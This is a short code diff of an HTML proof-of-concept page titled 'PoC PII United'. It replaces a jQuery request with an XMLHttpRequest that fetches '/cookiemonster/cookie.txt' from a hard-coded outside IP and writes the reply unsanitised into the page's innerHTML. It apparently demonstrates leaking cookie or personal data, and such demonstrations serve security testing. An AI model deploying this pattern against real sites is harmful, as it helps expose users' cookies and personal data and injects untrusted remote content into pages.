@@ -1,19 +1,18 @@
 <html>
 <head><title>PoC PII United</title></head>
 <body>
-<script src="http://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
 <script>
+var xhttp = new XMLHttpRequest();
 var url = 'http://93.66.243.251/cookiemonster/cookie.txt';
-var response = '';
-$.ajax({ type: "GET",   
-         url: url,   
-         async: true,
-         success : function(text)
-         {
-             response = text;
-         }
-});
-document.write(response);
+xhttp.open('GET', url , true);
+xhttp.send();
+xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		document.getElementById("x").innerHTML =
+		this.responseText;
+	}
+};
+
 </script>
 
 
